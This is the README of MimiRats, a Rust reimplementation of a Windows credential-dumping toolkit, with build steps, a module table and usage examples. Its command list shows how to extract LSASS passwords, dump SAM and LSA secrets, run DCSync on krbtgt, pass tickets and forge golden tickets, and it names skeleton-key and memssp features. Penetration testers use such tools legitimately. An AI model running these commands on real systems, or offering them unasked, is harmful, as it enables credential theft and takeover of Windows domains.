# MimiRats

Windows credential toolkit written in Rust.

```
  .#####.   MimiRats 0.1.0 (x64) - Rust edition
 .## ^ ##.  "Rewritten in Rust"
 ## / \ ##  Windows credential toolkit
 ## \ / ##
 '## v ##'
  '#####'
```

## Overview

MimiRats is a Rust reimplementation providing an interactive REPL and batch command-line interface. Commands follow the `module::command [/arg:value ...]` syntax.

**25 modules, 188 commands** covering:

| Category | Modules |
|----------|---------|
| Credential extraction | `sekurlsa`, `lsadump`, `vault`, `dpapi`, `ngc` |
| Kerberos | `kerberos` |
| Cryptography | `crypto` |
| System management | `privilege`, `token`, `process`, `service`, `event`, `sysenv`, `sid`, `net`, `ts` |
| Miscellaneous | `misc`, `minesweeper`, `iis`, `rpc` |
| Hardware | `busylight`, `sr98`, `rdm`, `acr` |
| Built-in | `standard` |

## Build

### Prerequisites

- Rust toolchain (edition 2021)
- For Windows targets: `x86_64-pc-windows-gnu` target and MinGW linker

### Cross-compile from macOS/Linux

```bash
rustup target add x86_64-pc-windows-gnu
cargo build --release
```

The default build target is `x86_64-pc-windows-gnu` (configured in `.cargo/config.toml`).

### Build on Windows

```bash
cargo build --release --target x86_64-pc-windows-msvc
```

### Run unit tests (host target)

```bash
cargo test --target "$(rustc -vV | grep host | awk '{print $2}')"
```

## Usage

### Interactive mode

```
> MimiRats.exe
mimrats # privilege::debug
mimrats # sekurlsa::logonPasswords
mimrats # exit
```

### Command-line mode

```
> MimiRats.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
```

### Key commands

```
# Credential extraction
privilege::debug
sekurlsa::logonPasswords
sekurlsa::msv
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::minidump /in:lsass.dmp

# SAM / Secrets / Cache dump
lsadump::sam /system:SYSTEM /sam:SAM
lsadump::secrets /system:SYSTEM /security:SECURITY
lsadump::cache /system:SYSTEM /security:SECURITY

# DCSync
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

# Kerberos
kerberos::list
kerberos::ptt /ticket:ticket.kirbi
kerberos::golden /admin:admin /domain:lab.local /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi

# Vault & Credentials
vault::list
vault::cred

# Crypto
crypto::hash /password:test /user:admin /domain:WORKGROUP
crypto::certificates /store:My
crypto::keys

# Process management
process::list
process::start /cmd:notepad.exe
process::stop /pid:1234

# Token
token::whoami
token::list
token::revert

# Service management
service::list
service::start /name:SvcName
service::stop /name:SvcName

# Misc
coffee
answer
version
```

## Module reference

| Module | Commands | Description |
|--------|----------|-------------|
| `standard` | 8 | Built-in commands (exit, cls, version, coffee, ...) |
| `privilege` | 9 | Privilege management (debug, driver, backup, ...) |
| `token` | 3 | Token manipulation (whoami, list, revert) |
| `process` | 5 | Process management (list, start, stop, suspend, resume) |
| `sekurlsa` | 20 | LSASS credential extraction |
| `lsadump` | 16 | SAM/Secrets/Cache/DCSync |
| `kerberos` | 11 | Kerberos ticket operations |
| `crypto` | 14 | Cryptographic providers, certificates, hashing |
| `dpapi` | 1 | DPAPI masterkey information |
| `ngc` | 5 | Windows Hello / NGC |
| `service` | 9 | Windows service management |
| `ts` | 4 | Terminal Server / RDP |
| `event` | 2 | Event log operations |
| `misc` | 8 | GPO bypass, memssp, skeleton key |
| `vault` | 3 | Windows Vault / Credential Manager |
| `minesweeper` | 1 | MineSweeper memory reader |
| `net` | 6 | SAM/Net API (users, groups, sessions) |
| `busylight` | 4 | BusyLight USB device |
| `sysenv` | 4 | UEFI system environment variables |
| `sid` | 4 | SID lookup and manipulation |
| `iis` | 1 | IIS configuration passwords |
| `rpc` | 3 | RPC server/client |
| `sr98` | 4 | SR98 RF device / T5577 |
| `rdm` | 2 | RDM 830 AL RF device |
| `acr` | 2 | ACR smartcard device |

## Architecture

```
src/
  main.rs          REPL and command dispatcher
  module.rs        Module/Command trait definitions
  output.rs        Banner and version constants
  win32.rs         Windows API helpers
  crypto.rs        Cryptographic primitives (MD4, AES, RC4, DES, HMAC, PBKDF2, ...)
  registry.rs      Registry hive parser (offline) and live registry access
  memory.rs        Process memory and minidump reader
  display.rs       Hex dump, SID/GUID/FILETIME formatting
  modules/
    mod.rs         Module registry (25 modules)
    standard.rs    Built-in commands
    privilege.rs   Privilege escalation
    token.rs       Token impersonation
    process.rs     Process management
    sekurlsa.rs    LSASS credential extraction
    lsadump.rs     SAM/Secrets/Cache/DCSync
    kerberos.rs    Kerberos operations
    crypto.rs      Cryptographic module commands
    vault.rs       Credential vault
    dpapi.rs       DPAPI masterkeys
    ngc.rs         Windows Hello/NGC
    service.rs     Service management
    event.rs       Event log
    sysenv.rs      UEFI variables
    sid.rs         SID operations
    net.rs         SAM/Net API
    ts.rs          Terminal Server
    misc.rs        Miscellaneous tools
    iis.rs         IIS config parser
    rpc.rs         RPC operations
    minesweeper.rs MineSweeper reader
    busylight.rs   BusyLight device
    sr98.rs        SR98 RF device
    rdm.rs         RDM RF device
    acr.rs         ACR device
```

## Testing

Functional tests are in `tests/run_tests.ps1` (PowerShell, requires Windows with admin privileges). The test suite covers all implemented modules including offline registry hive parsing.

```powershell
.\tests\run_tests.ps1
```

## License

This project is for educational and authorized security testing purposes only.
